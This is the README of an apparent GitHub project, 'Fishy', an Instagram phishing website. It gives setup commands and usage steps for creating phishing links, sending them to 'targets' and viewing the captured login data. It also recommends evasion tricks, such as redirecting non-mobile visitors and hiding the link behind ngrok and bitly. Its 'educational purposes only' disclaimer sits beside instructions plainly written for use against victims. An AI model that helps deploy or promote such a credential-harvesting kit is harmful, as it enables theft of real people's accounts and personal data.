# Fishy
Hungwy? **Fishy** someone...

# Fishy - Instagram Phising Website

Fishy is a simple educational phising website. This project was created for educational purposes only. Please note that the current version (v2) is designed to target multiple victims simultaneously, unlike the previous version (v1), which targeted only one victim at a time.

## Disclaimer

**Disclaimer: This project is intended for educational purposes only. The developer is not responsible for any malpractices or misuse of this software. Any actions taken with this software outside the scope of ethical and educational purposes are strictly the responsibility of the user.**

## Features

- **Version 2 (v2)**:
  - Supports multiple concurrent user logins.
  - Custom endpoinds/backends.
  - Create, Update and Delete endpoints.
  
- **Version 1 (v1)**:
  - Supports a single user login at a time.
  - Basic implementation for learning purposes.

## Getting Started

To get started with Fishy, follow these steps:

### 1. Clone the Repository:

   ```bash
   git clone https://github.com/sh3ldr0id/Fishy.git
   ```

### 2. Navigate to the Project Directory:

   ```bash
   cd Fishy/
   ```

### 3. Create and Activate Virtual Env:

   ```bash
   python -m venv venv
   ```

   * On Windows
   ```bash
   venv\Scripts\activate
   ```
   * On macOS and Linux
   ```bash
   source venv/bin/activate
   ```

### 4. Install Dependancies:

   ```bash
   pip install -r requirements.txt
   ```

### 5. Run the server:

   ```bash
   python app.py
   ```
   
## Usage

   ### Create Fishy Link:
   Go to http://localhost:5000/password/create and follow the steps there to create a link. (Replace password with your password. Default password is "password")

   ### Send Link to Target:
   Send http://localhost:5000/backend to your target. (Replace backend with the backend provided at the create page.)

   ### View and Manage your Link:
   Go to http://localhost:5000/password/backend/view to view and update your data.

## Note
   - *Fishy* automatically redirects the targets Instagram 404 if the target's device is not a mobile device or if a request is send to a random url.
   - Update "config.json" according to your needs.
   - By default the server runs at **http://127.0.0.1:4156** with "password" as it's password.
   - Use *Fishy* along with a tunneling service like *ngrok* and a link shortening service like *bitly* for best results.


## Contact

If you have any questions or need further information about this project, you can contact the developer at sh3ldr0id@gmail.com.